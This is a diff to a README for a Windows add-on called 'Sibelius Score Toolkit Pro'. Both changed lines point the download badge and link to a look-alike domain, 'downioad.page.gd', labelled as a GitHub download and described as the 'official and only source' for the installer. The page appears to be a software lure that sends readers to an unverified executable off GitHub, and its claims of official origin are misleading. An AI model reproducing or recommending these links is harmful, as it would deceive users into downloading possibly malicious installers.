@@ -2,7 +2,7 @@
 
 Welcome to the **Sibelius Score Toolkit Pro**, the essential companion for musicians, composers, and arrangers looking to elevate their workflow within the Sibelius environment on Windows. This tool provides a suite of features designed to streamline score creation, expand audio integration, and customize the user interface for optimal productivity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -56,7 +56,7 @@ A: The toolkit will notify you of available updates upon launch. You can also re
 
 To get the latest version of the Sibelius Score Toolkit Pro for Windows, please use the link below. This is the official and only source for the installer.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Disclaimer & License
 
